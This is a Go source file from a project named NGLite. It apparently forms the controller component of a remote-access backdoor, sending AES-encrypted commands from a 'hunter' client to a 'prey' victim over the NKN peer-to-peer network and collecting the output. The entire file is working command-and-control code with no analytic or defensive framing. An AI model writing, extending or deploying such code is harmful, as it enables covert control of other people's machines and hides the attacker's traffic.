package core

import (
	"NGLite/internal/transport"
	"NGLite/module/cipher"
	"fmt"
	"time"

	nkn "github.com/nknorg/nkn-sdk-go"
)

type CommandDispatcher struct {
	transport *transport.TransportManager
	aesKey    string
}

func NewCommandDispatcher(tm *transport.TransportManager, aesKey string) *CommandDispatcher {
	return &CommandDispatcher{
		transport: tm,
		aesKey:    aesKey,
	}
}

func (cd *CommandDispatcher) SendCommand(preyID, command string) (string, error) {
	preyClient, err := cd.transport.CreateClient(preyID)
	if err != nil {
		return "", fmt.Errorf("failed to create prey client: %w", err)
	}
	defer preyClient.Close()

	hunterClient, err := cd.transport.CreateRandomClient()
	if err != nil {
		return "", fmt.Errorf("failed to create hunter client: %w", err)
	}
	defer hunterClient.Close()

	select {
	case <-hunterClient.OnConnect.C:
	case <-time.After(30 * time.Second):
		return "", fmt.Errorf("hunter client connection timeout")
	}

	encrypted, err := cipher.AesCbcEncrypt([]byte(command), []byte(cd.aesKey))
	if err != nil {
		return "", fmt.Errorf("failed to encrypt command: %w", err)
	}

	onReply, err := hunterClient.Send(
		nkn.NewStringArray(preyClient.Address()),
		encrypted,
		nil,
	)
	if err != nil {
		return "", fmt.Errorf("failed to send command: %w", err)
	}

	select {
	case reply := <-onReply.C:
		return string(reply.Data), nil
	case <-time.After(30 * time.Second):
		return "", fmt.Errorf("command execution timeout")
	}
}

